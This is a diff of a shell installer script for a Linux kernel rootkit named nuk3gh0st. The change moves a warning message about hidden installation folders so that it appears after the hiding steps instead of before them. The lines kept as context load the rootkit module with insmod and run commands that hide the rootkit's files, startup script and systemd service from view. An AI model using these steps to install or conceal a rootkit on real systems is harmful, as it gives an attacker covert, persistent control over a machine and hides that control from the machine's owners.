@@ -12,11 +12,6 @@ echo -e "   ${purple}cmd: insmod /usr/lib/rootkit.ko${endColor}"
 insmod /usr/lib/rootkit.ko
 echo ""
 echo -e "${item}Hidding nuk3gh0st files"
-echo ""
-echo -e "${yellow}WARNING: you won't be able to see the installation folder"
-echo -e "until you unload the rootkit, but it will still exist "
-echo -e "and you can access to it if you remember the path${endColor}"
-echo ""
 echo -e "   ${purple}cmd: nuk3gh0st --hide-file=rootkit.ko${endColor}"
 nuk3gh0st --hide-file=rootkit.ko
 echo -e "   ${purple}cmd: nuk3gh0st --hide-file=nuk3gh0st${endColor}"
@@ -33,3 +28,8 @@ echo -e "   ${purple}cmd: nuk3gh0st --hide-file=nuk3gh0st.startup${endColor}"
 nuk3gh0st --hide-file=nuk3gh0st.startup
 echo -e "   ${purple}cmd: nuk3gh0st --hide-file=nuk3gh0st.service${endColor}"
 nuk3gh0st --hide-file=nuk3gh0st.service
+echo ""
+echo -e "${yellow}WARNING: you won't be able to see the installation folder"
+echo -e "until you unload the rootkit, but it will still exist "
+echo -e "and you can access to it if you remember the path${endColor}"
+echo ""
